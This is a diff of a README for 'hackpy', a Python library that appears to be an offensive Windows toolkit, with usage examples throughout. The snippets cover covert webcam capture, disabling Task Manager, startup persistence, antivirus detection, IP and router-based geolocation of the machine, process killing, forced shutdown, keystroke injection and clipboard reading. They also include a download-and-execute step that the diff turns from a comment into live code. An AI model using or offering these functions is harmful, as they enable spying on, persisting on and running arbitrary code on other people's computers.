@@ -1,33 +1,53 @@
-﻿![Python](https://www.python.org/static/img/python-logo@2x.png)
-# `pip install hackpy ` :bomb:
-![](https://picua.org/images/2019/07/02/a565a62aa7c27eb1339c6cb0be7c9d49.png)
+![Python](https://www.python.org/static/img/python-logo@2x.png)
+# `pip install hackpy` :bomb:
 
 # Example usage:
 ``` python
+
+# Import modules
+import os
 import hackpy
 
+```
 
-# Webcam
+
+# Webcam screenshot
+``` python
 hackpy.webcam(filename = 'screenshot.png', delay = 4500, camera = 1)
+```
 
 # TaskManager
+
+``` python
 if hackpy.taskmanager.find('iexplore.exe') == True: # If process iexplore.exe found:
     hackpy.taskmanager.kill('iexplore.exe') # Stop iexplore.exe process,
-    hackpy.taskmanager.start('chrome.exe') # start chrome.exe process
+    hackpy.taskmanager.start('firefox.exe') # start firefox.exe process
+
+for process in hackpy.taskmanager.list(): # Return dictonary with all processes
+	print( process )
 
 hackpy.taskmanager.disable() # Disable windows taskmgr.exe
 hackpy.taskmanager.enable()  # Enable windows taskmgr.exe
+```
 
 # Autorun
-hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = True) # Add cmd.exe to startup
-hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False) # Remove cmd.exe from startup
+``` python
+# Add cmd.exe to startup
+hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = True)
+
+# Remove cmd.exe from startup
+hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False)
+```
 
 # Detect installed antivirus software on computer:
+``` python
 data = hackpy.detect_protection()
 for antivirus in data:
     print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
+```
 
 # Information about you IP:
+``` python
 data = hackpy.whois()
 print('[?] - You IP is: ' + data['query'])
 print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
@@ -42,44 +62,64 @@ print('[?] - Other Information about IP:\n' + str(data))
 data = hackpy.geoplugin()
 print('[?] - Latitude: ' + data['geoplugin_latitude'])
 # Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}
+```
 
 # Get router bssid:
+``` python
 bssid_string = hackpy.router() # BETA
 # Find LATITUDE and LONGITUDE with router BSSID:
 data = hackpy.bssid_locate(bssid_string)
 print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))
+```
 
 # Windows messagebox:
+``` python
 hackpy.messagebox('error', 'LOL', 'System has been killed :D') # none, info, error, warning, question types
+```
 
-# Nircmdc reference: https://nircmd.nirsoft.net
+# Nircmdc commands
+``` python
+# You can run nircmdc commands in python
 hackpy.command.nircmdc('monitor off')
 hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
 
+# Nircmdc reference: https://nircmd.nirsoft.net
+```
+
 # System commands
+``` python
 hackpy.command.system('shutdown -s -t 260')
+```
 
 # SendKeyPress:
+``` python
 hackpy.sendkey('Hello bro{ENTER}')
-#Other keys: https://pastebin.com/Ns3P7UiH
+# Other keys: https://pastebin.com/Ns3P7UiH
+```
 
+# Clipboard
+``` python
 # Get text from clipboard:
 data = hackpy.clipboard.get()
 print('Text in clipboard is ' + data)
 
 # Set text to clipboard:
 hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
+```
 
 # Download python and install it:
+``` python
 if hackpy.check_python() == False: # Check if python installed on system. False - not installed, True - installed.
-    print('Python is not installed, trying to install!')
-    hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37
+	print('Python is not installed, trying to install!')
+	hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37
 else:
-    print('Python is installed!')
+	print('Python is installed!')
+```
 
 # Load and execute file from internet
-# file = hackpy.wget(direct.link.here)
-# os.startfile(file)
+``` python
+file = hackpy.wget(url)
+os.startfile(file)
 ```
 
 <br> *nircmdc reference: https://nircmd.nirsoft.net* <br>
